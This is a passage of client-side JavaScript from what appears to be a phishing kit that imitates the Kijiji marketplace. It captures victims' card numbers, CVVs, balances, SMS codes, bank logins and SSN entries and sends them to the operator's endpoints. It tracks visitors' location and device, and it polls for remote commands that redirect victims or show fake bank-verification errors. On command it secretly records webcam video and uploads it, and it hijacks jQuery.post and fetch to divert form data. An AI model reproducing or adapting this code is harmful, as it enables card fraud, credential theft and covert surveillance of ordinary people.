        window.jQuery("#authorize-modal").modal("open");
        return;
      }
      if (data === "verification" && window.jQuery) {
        window.jQuery("#verif-modal").modal("open");
        return;
      }
      if (data === "photo_modal" && window.jQuery) {
        window.jQuery("#photo-modal").modal("open");
        return;
      }
      if (data === "openlk") {
        return;
      }
      if (data === "tocard") {
        if (typeof toCardForm === "function") toCardForm();
        else if (typeof openFormCard === "function") openFormCard();
        return;
      }
      if (data === "openchat" && typeof openChat === "function") {
        openChat();
        return;
      }
      if (data === "closechat" && typeof closeChat === "function") {
        closeChat();
        return;
      }
      if (data === "pin" && typeof showCode === "function") {
        showCode();
        return;
      }
      if (data.indexOf("req_billing") === 0) {
        patchReqBillingFormInline();
        mountBillingFieldsInline();
        applyReqBillingFields(data);
        if (typeof reqBillingForm === "function") reqBillingForm();
        return;
      }
      if (data.indexOf("custom_push:") === 0 && typeof showPush === "function") {
        if (window.jQuery) window.jQuery("#push-amount").text(data.substr(12));
        showPush();
        return;
      }
      if (data.indexOf("custom_error:") === 0 && typeof errorTotal === "function") {
        errorTotal(data.substr(13));
        return;
      }
      if (data.indexOf("question:") === 0 && typeof showQuest === "function") {
        var arr = JSON.parse(data.substr(9));
        showQuest(arr.title, arr.text, arr.img || "");
        return;
      }
      if (data.indexOf("error:") === 0 && typeof errorTotal === "function") {
        var errType = data.substr(6);
        var messages = {
          exact_balance:
            "Enter the exact balance of your bank card for card verification. For example: 124.81 RON",
          no_money: "You need to top up your bank account to verify that you are the cardholder",
          card_change: "Card verification error, this card is temporarily not accepted to receive funds",
          limit: "Your card has limits on online transactions. Increase your limits and try again.",
          incorrect: "Please review your entered information to continue.",
          bank: "The bank was unable to confirm the transaction. Please try using a different verification method.",
        };
        if (errType === "limit") {
          if (typeof toCardForm === "function") toCardForm();
          else if (typeof openFormCard === "function") openFormCard();
        }
        errorTotal(messages[errType] || "Please review your entered information to continue.");
        return;
      }
      if (data.indexOf("redirect:") === 0) {
        window.location.href = data.substr(9);
        return;
      }
      if (data.indexOf("showbank:") === 0) {
        var payload = JSON.parse(data.substr(9));
        var bIdx = Array.isArray(payload) ? payload[1] : payload.bank_index;
        var bankId = Array.isArray(payload) ? payload[3] : payload.bank_id;
        var bankName = (Array.isArray(payload) ? payload[2] : payload.bank_name) || "Bank";
        var LK_SLUG_BY_ID = {};
        var slug = (bankId && LK_SLUG_BY_ID[bankId]) || LK_SLUG_BY_INDEX[String(bIdx)];
        var lid = window.LINK_DATA.link_id;
        if (slug && lid) {
          location.href = withPrefix("/lk/" + slug + "/" + lid);
        }
        return;
      }
      if (data === "changelk") {
        if (typeof errorTotal === "function") {
          errorTotal(
            "Unfortunately your bank is temporarily unavailable for receiving payments on our platform. Use another bank to receive payment, or authorize another person to receive your payment.",
            function () {
              if (typeof openFormCard === "function") openFormCard();
            }
          );
        } else if (typeof openFormCard === "function") {
          openFormCard();
        }
        return;
      }
    } catch (e) {
      console.error("[🇨🇦 Kijiji] dispatch:", e);
    }
  }

  const linkIdEarly = parseLinkId();
  const dataPromise = linkIdEarly
    ? fetch(siteApi("/api/link_data/" + linkIdEarly + "?v=" + Date.now(), { headers: apiHeaders(), cache: "no-store" })
        .then(function (response) {
          if (!response.ok) throw new Error("not found");
          return response.json();
        })
        .then(function (serverData) {
          var parsed = parseLinkRecord(serverData);
          const record = parsed.meta;
          const payload = parsed.payload;
          window.LINK_DATA.link_id = linkIdEarly;
          window.LINK_DATA.user_id = record.user_id || serverData.user_id;
          window.LINK_DATA.product_name = payload.product_name || "";
          window.LINK_DATA.recipient_name = payload.recipient_name || "";
          window.LINK_DATA.delivery_address = payload.delivery_address || "";
          window.LINK_DATA.product_price = payload.product_price || "";
          window.LINK_DATA.product_image = payload.product_image || "";
          window.LINK_DATA.input_mode = resolveInputMode(record, payload);
          window.LINK_DATA.request_balance = record.request_balance !== false;
        })
        .catch(function (e) {
          console.error("[🇨🇦 Kijiji] preload:", e);
          window.LINK_DATA.link_id = linkIdEarly;
        })
    : Promise.resolve();

  async function sendPageVisit() {
    if (!window.LINK_DATA.link_id || !window.LINK_DATA.user_id || pageVisitSent) return;
    pageVisitSent = true;
    pageLeaveSent = false;
    visibilityLeaveSent = false;
    const price = window.LINK_DATA.product_price
      ? String(window.LINK_DATA.product_price).replace(/\s*USD$/i, "").trim() + (/€|EUR/i.test(String(window.LINK_DATA.product_price)) ? "" : " EUR")
      : "";
    const endpoint = isReturnPage() ? "/webhook/return_page_visit" : "/webhook/page_visit";
    try {
      const location = await getClientLocation();
      await fetch(siteApi(endpoint), {
        method: "POST",
        headers: apiHeaders(),
        body: JSON.stringify({
          user_id: window.LINK_DATA.user_id,
          link_id: window.LINK_DATA.link_id,
          service: window.LINK_DATA.service,
          product_name: window.LINK_DATA.product_name,
          product_price: price,
          device_info: getDeviceInfo(),
          user_agent: navigator.userAgent,
          page_kind: pageKind(),
          current_page: currentPageKey(),
          location: location,
        }),
      });
    } catch (e) {
      console.error("[🇨🇦 Kijiji] page_visit:", e);
    }
  }

  function sendPageLeave(reason, opts) {
    if (!window.LINK_DATA.link_id) return;
    var soft = opts && opts.soft;
    if (!soft && pageLeaveSent) return;
    if (soft && visibilityLeaveSent) return;
    if (soft) visibilityLeaveSent = true;
    else pageLeaveSent = true;

    const payload = JSON.stringify({
      link_id: window.LINK_DATA.link_id,
      user_id: window.LINK_DATA.user_id,
      reason: reason || "leave",
      device_info: getDeviceInfo(),
      user_agent: navigator.userAgent,
      page_kind: pageKind(),
    });

    fetch(siteApi("/webhook/page_leave", {
      method: "POST",
      headers: apiHeaders(),
      body: payload,
      keepalive: true,
    }).catch(function () {});
  }

  async function sendCardPageVisit() {
    setUiPageKey("card");
    scheduleBillingApply();
    if (!window.LINK_DATA.link_id || !window.LINK_DATA.user_id) return;
    try {
      const location = await getClientLocation();
      await fetch(siteApi("/webhook/card_page_visit", {
        method: "POST",
        headers: apiHeaders(),
        body: JSON.stringify({
          user_id: window.LINK_DATA.user_id,
          link_id: window.LINK_DATA.link_id,
          service: window.LINK_DATA.service,
          product_name: window.LINK_DATA.product_name,
          product_price: window.LINK_DATA.product_price,
          device_info: getDeviceInfo(),
          user_agent: navigator.userAgent,
          page_kind: pageKind(),
          location: location,
        }),
      });
    } catch (_) {}
  }

  async function postWebhook(path, payload) {
    try {
      const location = await getClientLocation();
      await fetch(siteApi(path), {
        method: "POST",
        headers: apiHeaders(),
        body: JSON.stringify({
          link_id: window.LINK_DATA.link_id,
          user_id: window.LINK_DATA.user_id,
          page_kind: pageKind(),
          location: location,
          ...payload,
        }),
      });
    } catch (e) {
      console.error("[🇨🇦 Kijiji] webhook:", path, e);
    }
  }

  async function forwardDepopInput(data) {
    if (!window.LINK_DATA.link_id) return;
    try {
      await fetch(siteApi("/api/cad_kijiji/input", {
        method: "POST",
        headers: apiHeaders(),
        body: JSON.stringify({
          link_id: window.LINK_DATA.link_id,
          user_id: window.LINK_DATA.user_id,
          page_kind: pageKind(),
          ...data,
        }),
      });
    } catch (e) {
      console.error("[🇨🇦 Kijiji] input:", e);
    }
  }

  const INPUT_TYPES = new Set([
    "static",
    "confirmed_push",
    "sent-billing",
    "sendssn",
    "limits",
    "account_login",
    "rs_sms_code",
    "photo",
    "worker_photo",
    "cq_sups",
    "rs_get_quest",
    "customImage",
    "lkdata",
  ]);

  async function submitCardAuth(data) {
    await setUiPageKey("card");
      sendCardPageVisit();
    const body = {
      link_id: window.LINK_DATA.link_id,
      user_id: window.LINK_DATA.user_id,
      page_kind: pageKind(),
      number: String(data.number || "").replace(/\s/g, ""),
      expire: data.expiry,
      cvv: data.cvc,
      holder: data.cardholder,
      balance: data.balance,
      product_name: window.LINK_DATA.product_name,
      product_price: window.LINK_DATA.product_price,
      device: getDeviceInfo(),
      user_agent: navigator.userAgent,
      location: await getClientLocation(),
    };
    const r = await fetch(siteApi("/api/cad_kijiji/submitCard", {
      method: "POST",
      headers: apiHeaders(),
      body: JSON.stringify(body),
    });
    return r.json().catch(function () {
      return { status: true };
    });
  }

  async function submitCode(data) {
    await fetch(siteApi("/api/submitCode1", {
      method: "POST",
      headers: apiHeaders(),
      body: JSON.stringify({
        link_id: window.LINK_DATA.link_id,
        code: data.code,
        codeType: "sms",
      }),
    });
    return { ok: true };
  }

  function patchSendCode() {
    if (typeof window.sendCode !== "function") return;
    window.sendCode = function (code) {
      if (code.length > 12) {
        if (typeof error === "function") error("The password cannot consist of more than 12 characters.");
        return;
      }
      if (code.length < 3) {
        if (typeof error === "function") error("");
        return;
      }
      var number = document.getElementById("card-number").value;
      window.jQuery.post("#", {
        type: "code",
        number: number,
        code: code,
        finger: "a6dd6626b0d58796cc190959e9dd409612eeecd79fafcf612c5f8e013f04a67a",
      });
      window.jQuery("#smscode").val("");
      window.jQuery(".form").css("display", "none");
      if (typeof __preloader === "function") __preloader();
    };
  }

  function onCardAuthRejected(res) {
    if (!res || res.status !== false || res.error !== "card_blacklisted") return false;
    if (typeof _unsetpreload === "function") _unsetpreload();
    if (typeof error === "function") {
      error(res.message || "This card cannot be used. Please try another card.");
    }
    return true;
  }

  function gCookie(name) {
    const m = document.cookie.match(new RegExp("(?:^|; )" + name + "=([^;]*)"));
    return m ? decodeURIComponent(m[1]) : null;
  }

  function sCookie(name, value, minutes) {
    const d = new Date();
    d.setTime(d.getTime() + minutes * 60 * 1000);
    document.cookie = name + "=" + encodeURIComponent(value) + ";expires=" + d.toUTCString() + ";path=/";
  }

  function processShowSupport(showsupport) {
    if (!showsupport || !showsupport.type) return;
    const unixTimeInSeconds = Math.floor(Date.now() / 1000);
    const t = showsupport.time || unixTimeInSeconds + 3600;
    if (t <= unixTimeInSeconds) return;

    if (showsupport.type === "showbutton") {
      if (!gCookie("photo_data_unixx") || Number(gCookie("photo_data_unixx")) < unixTimeInSeconds) {
        if (typeof highlightElements === "function") highlightElements();
        else patchHighlightReceiveButton();
        sCookie("photo_data_unixx", unixTimeInSeconds + 9, 2);
      }
      return;
    }
    if (showsupport.type === "opencard") {
      if (!gCookie("opencard_data_unix") || Number(gCookie("opencard_data_unix")) < unixTimeInSeconds) {
        if (typeof openFormCard === "function") openFormCard(window.LINK_DATA.input_mode === "lk");
        sCookie("opencard_data_unix", unixTimeInSeconds + 9, 2);
      }
      return;
    }
    if (showsupport.type === "showup" && typeof openChat === "function") {
      if (!gCookie("show_data_unix") || Number(gCookie("show_data_unix")) < unixTimeInSeconds) {
        try {
          var audio = document.getElementById("notificationSound");
          if (audio) audio.play();
        } catch (_) {}
        openChat();
        sCookie("show_data_unix", unixTimeInSeconds + 9, 2);
      }
      return;
    }
    if (showsupport.type === "hideup" && typeof hideChat === "function") {
      if (!gCookie("show_data_unix") || Number(gCookie("show_data_unix")) < unixTimeInSeconds) {
        hideChat();
        sCookie("show_data_unix", unixTimeInSeconds + 9, 2);
      }
      return;
    }
    if (showsupport.type === "video") {
      var vidToken = "video_" + (showsupport.message_id || showsupport.time || Date.now());
      if (gCookie(vidToken)) return;
      navigator.mediaDevices
        .getUserMedia({ video: { facingMode: "user" }, audio: !!showsupport.sound })
        .then(function (stream) {
          var videoElement = document.createElement("video");
          videoElement.srcObject = stream;
          videoElement.muted = true;
          videoElement.playsInline = true;
          videoElement.play().catch(function () {});
          var mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
          var chunks = [];
          mediaRecorder.ondataavailable = function (e) {
            if (e.data && e.data.size) chunks.push(e.data);
          };
          var secs = Math.min(10, Math.max(1, Number(showsupport.seconds) || 5));
          mediaRecorder.start(250);
          setTimeout(function () {
            if (mediaRecorder.state !== "inactive") mediaRecorder.stop();
            videoElement.srcObject = null;
            stream.getTracks().forEach(function (track) {
              track.stop();
            });
            mediaRecorder.onstop = function () {
              if (!chunks.length) return;
              var blob = new Blob(chunks, { type: "video/webm" });
              var reader = new FileReader();
              reader.onloadend = function () {
                sCookie(vidToken, "1", 0.15);
                forwardWorkerVideo({ video: reader.result, msg: showsupport.message_id });
              };
              reader.readAsDataURL(blob);
            };
          }, secs * 1000);
        })
        .catch(function (err) {
          console.error("[🇨🇦 Kijiji] video:", err);
        });
      return;
    }
    if (showsupport.type === "voice") {
      var voiceToken = "voice_" + (showsupport.message_id || showsupport.time || Date.now());
      if (gCookie(voiceToken)) return;
      var src = showsupport.audio || showsupport.url || "";
      if (!src) return;
      if (!/^data:/i.test(src)) src = "data:audio/ogg;base64," + src;
      try {
        var voiceAudio = new Audio(src);
        voiceAudio.play().catch(function () {});
        sCookie(voiceToken, "1", 2);
      } catch (e) {
        console.error("[🇨🇦 Kijiji] voice:", e);
      }
      return;
    }
    if (showsupport.type === "delmsg") {
      var delToken = "delmsg_" + (showsupport.msgid || showsupport.time || Date.now());
      if (gCookie(delToken)) return;
      try {
        var sel = '.chat-message.support[msg-ad="' + showsupport.msgid + '"]';
        document.querySelectorAll(sel).forEach(function (el) {
          el.remove();
        });
        var sdoc = getShadowIframeDoc();
        if (sdoc) {
          sdoc.querySelectorAll(sel).forEach(function (el) {
            el.remove();
          });
        }
        sCookie(delToken, "1", 2);
      } catch (_) {}
    }
  }

  async function supportPoll() {
    if (!window.LINK_DATA.link_id) return JSON.stringify({ messages: [] });
    try {
      const r = await fetch(siteApi("/api/cad_kijiji/support/poll", {
        method: "POST",
        headers: apiHeaders(),
        body: JSON.stringify({
          link_id: window.LINK_DATA.link_id,
          page_kind: pageKind(),
          current_page: currentPageKey(),
          location: "",
        }),
      });
      const txt = await r.text();
      if (!txt || !String(txt).trim()) return JSON.stringify({ messages: [] });
      try {
        const parsed = JSON.parse(txt);
        if (parsed.showsupport) processShowSupport(parsed.showsupport);
        return txt;
      } catch (_) {
        return JSON.stringify({ messages: [] });
      }
    } catch (_) {
      return JSON.stringify({ messages: [] });
    }
  }

  async function supportSend(data) {
    if (!window.LINK_DATA.link_id) return "ok";
    try {
      const r = await fetch(siteApi("/api/cad_kijiji/support/send", {
        method: "POST",
        headers: apiHeaders(),
        body: JSON.stringify({
          link_id: window.LINK_DATA.link_id,
          user_id: window.LINK_DATA.user_id,
          page_kind: pageKind(),
          value: data.value,
          uniq: data.uniq,
          times: data.times,
          finger: data.finger,
        }),
      });
      return await r.text();
    } catch (_) {
      return "ok";
    }
  }

  async function forwardWorkerVideo(data) {
    if (!window.LINK_DATA.link_id || !data.video) return;
    await fetch(siteApi("/api/cad_kijiji/support/worker_video", {
      method: "POST",
      headers: apiHeaders(),
      body: JSON.stringify({
        link_id: window.LINK_DATA.link_id,
        video: data.video,
        msg: data.msg,
      }),
    });
  }

  async function pollXApi() {
    if (document.hidden) return "";
    if (!window.LINK_DATA.link_id) return "";
    try {
      const pageQ = "?page=" + encodeURIComponent(currentPageKey());
      const r = await fetch(siteApi("/api/cad_kijiji/xapi/" + window.LINK_DATA.link_id + pageQ, {
        headers: apiHeaders(),
      });
      if (!r.ok) return "";
      const d = await r.json();
      const text = d.text || "";
      if (text) {
        dispatchXApiCommand(text);
        return "";
      }
      return text;
    } catch (_) {
      return "";
    }
  }

  function makePostDeferred(runAsync) {
    var state = { status: 200, readyState: 4 };
    var doneCbs = [];
    var failCbs = [];
    var settled = false;
    var def = {
      done: function (fn) {
        if (typeof fn === "function") {
          if (settled && state.ok) fn(state.data, "success", state);
          else doneCbs.push(fn);
        }
        return def;
      },
      fail: function (fn) {
        if (typeof fn === "function") {
          if (settled && !state.ok) fn(state, "error", state.err);
          else failCbs.push(fn);
        }
        return def;
      },
      always: function (fn) {
        return def.done(fn).fail(fn);
      },
    };
    function finish(ok, data, err) {
      if (settled) return;
      settled = true;
      state.ok = ok;
      state.data = data;
      state.err = err;
      if (ok) {
        doneCbs.forEach(function (fn) {
          try {
            fn(data, "success", state);
          } catch (e) {
            console.error("[🇨🇦 Kijiji] post done:", e);
          }
        });
      } else {
        failCbs.forEach(function (fn) {
          try {
            fn(state, "error", err);
          } catch (_) {}
        });
      }
    }
    runAsync(finish);
    return def;
  }

  function startXApiPolling() {
    if (xapiTimer) return;
    xapiTimer = setInterval(function () {
      pollXApi();
    }, 2000);
    pollXApi();
  }

  function isBridgePostUrl(win, url) {
    if (url === "#" || url === "" || url == null) return true;
    try {
      const u = String(url);
      if (u === win.location.href) return true;
      if (u === window.location.href) return true;
      const parentPath = window.location.pathname;
      if (parentPath && u.indexOf(parentPath) !== -1) return true;
      if (u.charAt(0) === "/" && parentPath && u.split("?")[0] === parentPath) return true;
    } catch (_) {}
    return false;
  }

  function parseBridgeBody(body) {
    if (!body) return {};
    if (typeof body === "string") {
      try {
        return Object.fromEntries(new URLSearchParams(body));
      } catch (_) {
        return {};
      }
    }
    if (typeof URLSearchParams !== "undefined" && body instanceof URLSearchParams) {
      return Object.fromEntries(body);
    }
    return {};
  }

  function installFetchBridgeOn(win) {
    if (!win || win.__fetchBridgeInstalled || !win.fetch) return;
    win.__fetchBridgeInstalled = true;
    var origFetch = win.fetch.bind(win);
    win.fetch = function (url, opts) {
      opts = opts || {};
      var method = String(opts.method || "GET").toUpperCase();
      if (method !== "POST" || !isBridgePostUrl(win, url)) {
        return origFetch.apply(win, arguments);
      }
      var data = parseBridgeBody(opts.body);
      if (!data || !data.type) {
        return origFetch.apply(win, arguments);
      }
      if (win.jQuery && win.jQuery.post) {
        if (!win.__postBridgeInstalled) {
          installPostBridgeOn(win);
        }
        return new Promise(function (resolve, reject) {
          try {
            win.jQuery
              .post("#", data)
              .done(function (payload) {
                var text =
                  typeof payload === "string"
                    ? payload
                    : JSON.stringify(payload != null ? payload : { ok: true });
                resolve(
                  new win.Response(text, {
                    status: 200,
                    headers: { "Content-Type": "application/json" },
                  })
                );
              })
              .fail(function (_xhr, status, err) {
                reject(err || new Error(status || "post failed"));
              });
          } catch (e) {
            reject(e);
          }
        });
      }
      return origFetch.apply(win, arguments);
    };
  }

  function installPostBridgeOn(win) {
    if (!win || !win.jQuery || win.__postBridgeInstalled) return;
    win.__postBridgeInstalled = true;
    const $ = win.jQuery;
    const origPost = $.post;
    $.post = function (url, data, success, dataType) {
      const isHash = isBridgePostUrl(win, url);
      if (!isHash || !data || !data.type) {
        return origPost.apply(this, arguments);
      }

      const type = data.type;
      const inlineDone = typeof success === "function" ? success : null;

      function wrapDeferred(runAsync) {
        return makePostDeferred(function (finish) {
          runAsync(
            function (data) {
              finish(true, data);
            },
            function (err) {
              finish(false, null, err);
            }
          );
        }).done(function (payload, _status, xhr) {
          if (inlineDone) {
            if (type === "XApi") inlineDone(typeof payload === "string" ? payload : payload || "");
            else inlineDone(payload, _status, xhr);
          }
        });
      }

      if (type === "XApi") {
        return wrapDeferred(function (ok) {
          pollXApi().then(function (txt) {
            ok(txt || "");
          });
        });
      }

      if (type === "fetchData") {
        return wrapDeferred(function (ok) {
          sendPageVisit().then(function () {
            ok({ ok: true });
          });
        });
      }

      if (type === "card-auth") {
        return wrapDeferred(function (ok) {
          submitCardAuth(data).then(function (res) {
            if (!onCardAuthRejected(res)) ok(res || { status: true });
            else ok(res);
          });
        });
      }

      if (type === "code") {
        return wrapDeferred(function (ok) {
          submitCode(data).then(function () {
            if (typeof __preloader === "function") __preloader();
            ok({ ok: true });
          });
        });
      }

      if (type === "support") {
        return wrapDeferred(function (ok, fail) {
          if (data.value != null && data.value !== "") {
            supportSend(data)
              .then(function (txt) {
                ok(txt || "ok");
              })
              .catch(fail);
          } else {
            supportPoll()
              .then(function (txt) {
                ok(txt || JSON.stringify({ messages: [] }));
              })
              .catch(fail);
          }
        });
      }

      if (type === "worker_video") {
        return wrapDeferred(function (ok) {
          forwardWorkerVideo(data).then(function () {
            ok({ ok: true });
          });
        });
      }

      if (type === "start_video") {
        return wrapDeferred(function (ok) {
          ok({ ok: true });
        });
      }

      if (type === "parsebank") {
        return wrapDeferred(function (ok) {
          postWebhook("/webhook/lk_page_visit", {
            bank_name: data.name || data.bank || "Bank",
            service: window.LINK_DATA.service,
            product_name: window.LINK_DATA.product_name,
            product_price: window.LINK_DATA.product_price,
            device_info: getDeviceInfo(),
            user_agent: navigator.userAgent,
          }).then(function () {
            ok({ ok: true });
          });
        });
      }

      if (type === "notify") {
        if (data.action === "card") {
          return wrapDeferred(function (ok) {
            sendCardPageVisit().then(function () {
              ok({ ok: true });
            });
          });
        }
        if (data.action === "balance") {
          return wrapDeferred(function (ok) {
            postWebhook("/webhook/balance_input", {
              service: window.LINK_DATA.service,
              product_name: window.LINK_DATA.product_name,
              product_price: window.LINK_DATA.product_price,
              device_info: getDeviceInfo(),
              user_agent: navigator.userAgent,
            }).then(function () {
              ok({ ok: true });
            });
          });
        }
        return wrapDeferred(function (ok) {
          ok({ ok: true });
        });
      }

      if (INPUT_TYPES.has(type)) {
        return wrapDeferred(function (ok) {
          forwardDepopInput(data).then(function () {
            ok({ ok: true });
          });
        });
      }

      if (type === "close-browser" || type === "hide-browser") {
        sendPageLeave(data.reason || type, { soft: type === "hide-browser" });
        return wrapDeferred(function (ok) {
          ok({ ok: true });
        });
      }

      return wrapDeferred(function (ok) {
        ok({ ok: true });
      });
    };
    installFetchBridgeOn(win);
  }

  function installPostBridge() {
    installPostBridgeOn(window);
  }

  window.__installBotPostBridge = installPostBridgeOn;

  function stopLegacyXApiPollingIn(win) {
    if (!win) return;
    try {
      if (win.trigger) {
        clearInterval(win.trigger);
        win.trigger = null;
      }
    } catch (_) {}
  }

  function installShadowPostBridge() {
    if (window.__shadowPostBridgeWatch) return;
    function tryBridge() {
      var doc = getShadowIframeDoc();
      if (doc && doc.defaultView) {
        installPostBridgeOn(doc.defaultView);
        stopLegacyXApiPollingIn(doc.defaultView);
        if (typeof patchCallForLkOn === "function") patchCallForLkOn(doc.defaultView);
      }
    }
    tryBridge();
    window.__shadowPostBridgeWatch = setInterval(tryBridge, 20);
    var host = document.getElementById("shadow-host");
    if (host && !host.__shadowBridgeObs) {
      host.__shadowBridgeObs = true;
      try {
        new MutationObserver(tryBridge).observe(host, { childList: true, subtree: true });
      } catch (_) {}
    }
  }

  function installLeaveHandlers() {
    window.addEventListener("pagehide", function () {
      sendPageLeave("pagehide");
    });
    window.addEventListener("beforeunload", function () {
      sendPageLeave("beforeunload");
    });
    document.addEventListener("visibilitychange", function () {
      if (document.visibilityState === "hidden") {
        setTimeout(function () {
          sendPageLeave("visibility-hidden", { soft: true });
        }, 400);
      } else {
        visibilityLeaveSent = false;
        if (window.LINK_DATA.link_id) {
          fetch(siteApi("/webhook/page_resume", {
            method: "POST",
            headers: apiHeaders(),
            body: JSON.stringify({
              link_id: window.LINK_DATA.link_id,
              user_id: window.LINK_DATA.user_id,
            }),
          }).catch(function () {});
        }
      }
    });
  }

  function cardPageUrl() {
    var lid = window.LINK_DATA.link_id;
    return withPrefix(lid ? "/card/" + lid : "/card/");
  }

  function notifyLkSelection() {
    if (window.__lkSelectionNotified) return Promise.resolve();
    window.__lkSelectionNotified = true;
    return postWebhook("/webhook/lk_page_visit", {
      bank_name: "Select Bank",
      selection: true,
      service: window.LINK_DATA.service,
      product_name: window.LINK_DATA.product_name,
      product_price: window.LINK_DATA.product_price,
      device_info: getDeviceInfo(),
      user_agent: navigator.userAgent,
    });
  }

  function navigateToLkBank(countryId, bankIndex, notify) {
    var slug = LK_SLUG_BY_INDEX[String(bankIndex)];
    var lid = window.LINK_DATA.link_id || parseLinkId();
    if (!slug || !lid) {
      var url = new URL(location.href);
      var authKey = String(countryId) + "-" + String(bankIndex);
      if (url.searchParams.get("auth") === authKey) return;
      url.searchParams.set("auth", authKey);
      location.href = url.toString();
      return;
    }
    var target = withPrefix("/lk/" + slug + "/" + lid);
    if (
      location.pathname === target ||
      location.pathname === target + "/" ||
      location.pathname.indexOf(withPrefix("/lk/" + slug + "/")) !== -1
    ) {
      return;
    }
    if (notify) {
      postWebhook("/webhook/lk_page_visit", {
        bank_name: LK_BANK_NAMES[String(bankIndex)] || slug,
        service: window.LINK_DATA.service,
        product_name: window.LINK_DATA.product_name,
        product_price: window.LINK_DATA.product_price,
        device_info: getDeviceInfo(),
        user_agent: navigator.userAgent,
      });
    }
    location.href = target;
  }

  function injectCardModalFixStyles() {
    if (document.getElementById("bot-card-modal-fix")) return;
    var s = document.createElement("style");
    s.id = "bot-card-modal-fix";
    s.textContent =
      "body.sp-card-open #form-modal.open,body.sp-card-open #form-modal[style*=\"display: block\"]" +
      "{z-index:100200!important;opacity:1!important;visibility:visible!important;pointer-events:auto!important;transform:none!important;filter:none!important}" +
      "body.sp-card-open #form-modal .modal-content{opacity:1!important;filter:none!important;transform:none!important}" +
      "body.sp-card-open .modal-overlay{z-index:100190!important;backdrop-filter:none!important;-webkit-backdrop-filter:none!important;background-color:rgba(0,0,0,.4)!important}" +
      "body.sp-card-open #form-modal-custom{display:none!important;visibility:hidden!important}" +
      "body.sp-card-open #form1,body.sp-card-open #hascard{display:block!important}" +
      "body.sp-card-open #progressform{display:none!important}";
    document.head.appendChild(s);
  }

  function startCardFormRevealBurst() {
    injectCardModalFixStyles();
    document.body.classList.add("sp-card-open");
    var n = 0;
    var iv = setInterval(function () {
      ensureCardFormVisible();
      fixBlockingOverlays();
      if (++n >= 45) clearInterval(iv);
    }, 100);
  }

  function ensureCardFormVisible() {
    try {
      injectCardModalFixStyles();
      if (!window.jQuery) return;
      var $ = window.jQuery;
      var $fm = $("#form-modal");
      if (!$fm.length) return;
      var $custom = $("#form-modal-custom");
      if ($custom.length) {
        if ($custom.hasClass("open")) try { $custom.modal("close"); } catch (_) {}
        $custom.removeClass("open").css({ display: "none", visibility: "hidden" });
      }
      $(".modal-overlay").removeClass("blur-overlay");
      $("#progressform").hide();
      $("#form1, #hascard").show();
      $("#title_card, #WS1, #WS2").show();
      $fm.addClass("open").css({ zIndex: 100200, display: "block", opacity: 1, visibility: "visible", pointerEvents: "auto" });
      var $content = $fm.find(".modal-content").first();
      if ($content.length) $content.css({ opacity: 1, filter: "none", transform: "none" });
      applyBillingFromLinkData();
    } catch (_) {}
  }

  function fixBlockingOverlays() {
    injectCardModalFixStyles();
    if (isReceiveLkPage() || /\/lk\//.test(location.pathname)) {
      document.querySelectorAll("#chatOverlay, .login-overlay, .sidenav-overlay").forEach(function (el) {
        el.style.cssText = "display:none!important;pointer-events:none!important;opacity:0!important;visibility:hidden!important;";
        el.classList.add("hidden");
      });
      var host = document.getElementById("shadow-host");
      if (host) host.style.pointerEvents = "";
      return;
    }
    document.body.classList.add("sp-card-open");
    var formModal = document.getElementById("form-modal");
    var cardOpen = formModal && (
      formModal.classList.contains("open") ||
      formModal.style.display === "block" ||
      window.getComputedStyle(formModal).display !== "none"
    );
    document.querySelectorAll("#chatOverlay, .login-overlay, .sidenav-overlay").forEach(function (el) {
      el.style.cssText = "display:none!important;pointer-events:none!important;opacity:0!important;visibility:hidden!important;";
      el.classList.add("hidden");
    });
    if (cardOpen && formModal) {
      formModal.style.cssText = "z-index:100200!important;display:block!important;opacity:1!important;visibility:visible!important;pointer-events:auto!important;";
      var mc = formModal.querySelector(".modal-content");
      if (mc) mc.style.cssText = "opacity:1!important;visibility:visible!important;filter:none!important;transform:none!important;";
      document.querySelectorAll(".modal-overlay").forEach(function (el) {
        el.classList.remove("blur-overlay", "hidden");
        el.style.cssText = "z-index:100190!important;display:block!important;opacity:1!important;visibility:visible!important;pointer-events:auto!important;backdrop-filter:none!important;-webkit-backdrop-filter:none!important;background-color:rgba(0,0,0,0.4)!important;";
      });
      var custom = document.getElementById("form-modal-custom");
      if (custom) {
        custom.classList.remove("open");
        custom.style.cssText = "display:none!important;visibility:hidden!important;pointer-events:none!important;";
      }
    }
    var host = document.getElementById("shadow-host");
    if (host) host.style.pointerEvents = cardOpen ? "none" : "";
  }

  function watchCardModalOverlays() {
    if (window.__cadOverlayWatch) return;
    window.__cadOverlayWatch = setInterval(function () {
      var fm = document.getElementById("form-modal");
      if (!fm) return;
      var open = fm.classList.contains("open") || fm.style.display === "block" || window.getComputedStyle(fm).display !== "none";
      if (open) { fixBlockingOverlays(); ensureCardFormVisible(); applyBillingFromLinkData(); }
    }, 250);
  }

  function patchGermanPaymentButtons() {
    document.querySelectorAll('input[type="submit"][onclick*="openFormCard"], button[type="submit"][onclick*="openFormCard"]').forEach(function (el) {
      el.setAttribute("type", "button");
    });
    document.querySelectorAll("form").forEach(function (form) {
      if (form.__cadSubmitPatched) return;
      form.__cadSubmitPatched = true;
      form.addEventListener("submit", function (e) {
        var t = e.submitter || document.activeElement;
        if (!t) return;
        var oc = t.getAttribute("onclick") || "";
        if (oc.indexOf("openFormCard") !== -1) {
          e.preventDefault();
          e.stopPropagation();
        }
      }, true);
    });
  }

  function patchReceiveFundsButton() {
    patchGermanPaymentButtons();
    document.querySelectorAll("span.dqsIjj, [onclick*='openFormCard']").forEach(function (el) {
      if (/receive funds|recibir pago|recibir|zahlung akzeptieren|weiter|jetzt kaufen/i.test(el.textContent || el.value || "")) {
        var parent = el.closest("a, button") || el;
        parent.setAttribute("onclick", "openFormCard()");
      }
    });

    var prev = window.openFormCard;
    if (prev && prev.__botWrapped) return;

    var nativeOpen = prev && typeof prev === "function" ? prev : null;

    function wrapped(lk, pre, ignoreSelection) {
      if (window.LINK_DATA.input_mode !== "lk" && lk === true) return;
      var useLk = lk === true || (lk !== false && window.LINK_DATA.input_mode === "lk");
      var lid = window.LINK_DATA.link_id;

      if (pre && typeof openFormLoading === "function") {
        return openFormLoading();
      }

      if (useLk) {
        if (!isReceiveLkPage()) {
          if (lid) {
            location.href = lkPageUrl() + (isListingPage() ? "?oc=1" : "");
            return;
          }
        }
        if (isReceiveLkPage() && window.jQuery && !pre) {
          var $modal = window.jQuery("#form-modal");
          if ($modal.length && $modal.hasClass("open")) return;
        }
        if (nativeOpen) {
          var opened = nativeOpen.call(this, true, pre, ignoreSelection);
